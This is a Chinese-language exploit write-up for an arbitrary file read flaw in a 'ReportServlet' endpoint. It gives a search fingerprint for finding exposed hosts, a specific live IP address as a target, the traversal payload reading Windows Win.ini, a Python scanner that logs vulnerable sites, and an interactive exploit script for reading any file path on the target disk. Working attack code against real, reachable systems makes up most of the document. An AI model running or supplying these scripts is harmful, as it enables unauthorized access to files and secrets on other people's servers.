## 一、资产搜索

```
body="changeAccount('8000')"
```

## 二、网站测试

```
http://120.79.1.135:6005
```

## 三、验证漏洞

```
/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini
```

![image-20240914210933406](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914210933406.png)

## 四、POC

```
def poc(target):
    payload = "/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini"
    try:
        res1 = requests.get(target,verify=False)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "fonts" in res2.text:
                with open("result.txt","a",encoding="utf-8") as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print(f"该网站[+]{target}有问题，请手动测试！！")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    while True:
        content = input("请输入要查看的路径，当前目录c:,从/目录开始输入(q退出)\n>>>>>>>>>>>>>>>>>>")
        payload = "/ReportServlet?operation=getPicFile&fileName=/DISKC"
        res1 = requests.get(target, verify=False)
        if content == "q":
            exit()
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload +content, verify=False, timeout=5)
            print(res2.text)
        else:
            print("该文件不存在，请重新输入！！")
```

## 六、测试结果

![image-20240914211505318](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914211505318.png)

![image-20240914211145866](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914211145866.png)

